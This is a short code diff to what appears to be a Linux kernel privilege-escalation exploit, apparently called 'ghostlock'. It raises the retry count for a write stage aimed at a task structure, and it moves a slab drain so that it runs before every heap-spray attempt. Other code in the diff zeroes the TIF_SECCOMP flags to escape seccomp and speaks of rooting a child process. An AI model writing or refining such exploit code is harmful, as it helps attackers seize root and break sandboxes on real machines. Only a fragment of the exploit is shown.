@@ -398,7 +398,7 @@ namespace ghostlock::session::backend {
                         .leaf_to_target8 = 1,
                     };
                     const Status dir_ok = retry_write_stage<M>(
-                        session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
+                        session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 6, 50000,
                         victim::verify_leaf_dir_stage, &probe_context, 1);
                     if (!dir_ok) {
                         pr_warning("W3 leaf direction probe failed; retiring unrooted child\n");
@@ -479,7 +479,7 @@ namespace ghostlock::session::backend {
                  * did not (e.g. a seccomp filter appeared between the stages),
                  * fall back to probing here, the pre-move behaviour. */
                     Status dir_ok = retry_write_stage<M>(
-                        session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
+                        session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 6, 50000,
                         victim::verify_leaf_dir_stage, &w3_context, 1);
                     if (!dir_ok) {
                         /* U01/S14: upstream retires the child instead of guessing the leaf
@@ -512,7 +512,11 @@ namespace ghostlock::session::backend {
                     break;
                 }
                 pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
-                if (attempt == 1) attack::slab_drain();
+                /* Drain before every attempt, not just the first: each failed
+                 * attempt leaves its sprayed pages in the slab, and a drain
+                 * reclaims them so the next spray allocates fresh objects
+                 * again (same reclamation the W2+W3 chain rounds pay once). */
+                attack::slab_drain();
                 support::run_state::enter("w3b");
                 const memory::WriteRequest flags_request =
                         memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
